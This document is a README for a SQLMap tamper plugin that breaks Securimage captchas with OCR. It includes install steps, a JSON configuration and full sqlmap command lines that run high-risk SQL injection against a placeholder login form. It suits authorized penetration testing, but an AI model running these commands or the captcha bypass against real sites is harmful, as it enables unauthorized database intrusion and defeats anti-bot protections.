## Securimage Tamper

SQLMap tamper for breaking securimage captcha!

![Images](https://github.com/Diskominfo-Kota-Serang/securimagetamper/blob/master/assets/README.png)

# Installation

Ubuntu

```
sudo apt-get install tesseract-ocr-eng imagemagick catimg
```

Then

```
pip install pytesseract
```

Put files into `sqlmap/tamper` or any related to sqlmap `tamper` folder

# Usages

Always make `--tamper` have spaces between `--tamper` and `securimage`. Examples: `--tamper securimage jsonpath`

Below is Full Usages of json object

```
{
  "images": "http://example.com/lib/securimage/securimage_show.php",
  "parameters": "captcha_code",
  "headers": { "Cookie": "PHPSESSID=XXXXXXXXXXXXXXXXXXXXXXXXXXX" },
  "mode": "math",
  "config": {
    "convert": "-colorspace Gray -blur 3x1 -morphology Erode Diamond:1x8 -level 50%",
    "tesseract": "--psm 13 --oem 1 --dpi 150 -c tessedit_char_whitelist=1234567890x-+/"
  }
}
```

Note: Cookie should be manual inputed & never use automatically session, The json path input should be full path


## securimage tamper have 3 modes

- ###### math

Automatically evaluate math expressions

- ###### character

Manually input character

- ###### easy

Automatically input easy recognize character

### Full Examples

```
sqlmap --url "http://examples.com/index.php" --data "username=a&password=a" --method POST --dbms=mysql --cookie "PHPSESSID=XXXXXXXXXXXXXXXXXXXXXXXXXXX" --level 5 --risk 3 --random-agent -v 3 --tamper secureimage mysecurimagetamper.json
```

### Examples With Another Tamper

```
sqlmap --url "http://examples.com/index.php" --data "username=a&password=a" --method POST --dbms=mysql --cookie "PHPSESSID=XXXXXXXXXXXXXXXXXXXXXXXXXXX" --level 5 --risk 3 --random-agent -v 3 --tamper=varnish,luanginx --tamper secureimage mysecurimagetamper.json
```
